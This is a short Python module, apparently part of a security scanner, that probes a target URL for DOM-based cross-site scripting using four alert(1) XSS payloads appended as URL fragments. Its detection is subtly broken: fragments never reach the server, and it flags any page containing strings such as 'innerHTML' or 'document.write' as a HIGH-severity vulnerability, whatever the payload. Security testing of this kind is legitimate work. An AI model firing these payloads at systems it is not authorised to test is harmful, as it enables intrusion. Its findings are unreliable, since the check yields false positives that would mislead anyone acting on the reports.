"""
DOM-Based XSS Tester Module
Tests for DOM-based cross-site scripting vulnerabilities
"""
from typing import Dict, List
import requests

class DomXssTester:
    def __init__(self, target_url: str):
        self.target_url = target_url
        self.vulnerabilities = []
        self.payloads = [
            '#<script>alert(1)</script>',
            '#<img src=x onerror=alert(1)>',
            '#"><svg onload=alert(1)>',
            '#javascript:alert(1)'
        ]
    
    def test_all(self) -> List[Dict]:
        """Run all DOM-based XSS tests"""
        for payload in self.payloads:
            result = self._test_payload(payload)
            if result:
                self.vulnerabilities.append(result)
        return self.vulnerabilities
    
    def _test_payload(self, payload: str) -> Dict:
        """Test single DOM XSS payload"""
        try:
            response = requests.get(f"{self.target_url}{payload}", timeout=5)
            # Check for vulnerable JavaScript patterns
            if self._check_dom_vuln(response.text):
                return {
                    'type': 'DOM-Based XSS',
                    'severity': 'HIGH',
                    'payload': payload,
                    'evidence': 'Vulnerable DOM manipulation detected'
                }
        except:
            pass
        return None
    
    def _check_dom_vuln(self, response: str) -> bool:
        """Check for vulnerable DOM patterns"""
        patterns = ['document.location', 'window.location', 'innerHTML', 'document.write']
        return any(pattern in response for pattern in patterns)
